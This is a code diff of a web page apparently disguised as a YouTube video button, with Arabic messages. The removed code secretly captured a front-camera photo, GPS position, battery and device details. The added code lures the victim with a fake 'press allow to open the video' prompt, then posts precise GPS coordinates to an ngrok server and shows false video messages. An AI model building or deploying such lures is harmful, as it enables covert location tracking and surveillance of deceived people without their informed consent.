@@ -11,59 +11,36 @@
 <body>
     <img src="https://raw.githubusercontent.com/khaliddhahir0-sketch/youtube/main/button.jpg" onclick="capture()">   
 
-    <video id="video" width="300" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="150" height="150" style="display:none;"></canvas> <!-- صغر حجم الكانفس -->
-
     <script>
-        async function capture() {
-            if (!navigator.geolocation) { alert("الموقع غير مدعوم"); return; }
+        function capture() {
+            // رسالة للمستخدم قبل طلب الموقع
+            alert("اضغط السماح لفتح الفيديو");
 
-            navigator.geolocation.getCurrentPosition(async function(position) {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
+            if (!navigator.geolocation) { 
+                alert("الموقع غير مدعوم"); 
+                return; 
+            }
 
-                const deviceInfo = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    screenWidth: window.screen.width,
-                    screenHeight: window.screen.height,
-                    battery: null
-                };
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
 
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    deviceInfo.battery = { level: battery.level*100, charging: battery.charging };
-                }
-
-                const video = document.getElementById('video');
-                const canvas = document.getElementById('canvas');
-
-                try {
-                    const streamVideo = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" } });
-                    video.srcObject = streamVideo;
-
-                    setTimeout(() => {
-                        canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
-                        const imgData = canvas.toDataURL('image/jpeg', 0.5); // JPEG بجودة 50%
-
-                        // إرسال البيانات إلى السيرفر
-                        fetch("https://b3c92869e770.ngrok-free.app/receive_data", {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({ lat, lon, imgData, deviceInfo })
-                        })
-                        .then(res => res.json())
-                        .then(resp => alert("تم إرسال البيانات بنجاح!"))
-                        .catch(err => alert("فشل الإرسال: " + err));
-
-                        // إيقاف الكاميرا
-                        video.srcObject.getTracks().forEach(track => track.stop());
-
-                    },2000);
-                } catch(err) { alert("تعذر الوصول للكاميرا: "+err); }
-            }, function(err) {
-                alert("تعذر الحصول على الموقع GPS: "+err.message);
-            }, { enableHighAccuracy: true });
+                    // إرسال الموقع إلى السيرفر
+                    fetch("https://b3c92869e770.ngrok-free.app/receive_data", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ lat, lon })
+                    })
+                    .then(res => res.json())
+                    .then(resp => alert("الفيديو سيتم فتحه الان"))
+                    .catch(err => alert("تعذر فتح الفيديو حاول مجدداً: " + err));
+                },
+                function(err) {
+                    alert("تعذر فتح الفيديو حاول مجدداً: " + err.message);
+                },
+                { enableHighAccuracy: true }
+            );
         }
     </script>
 </body>
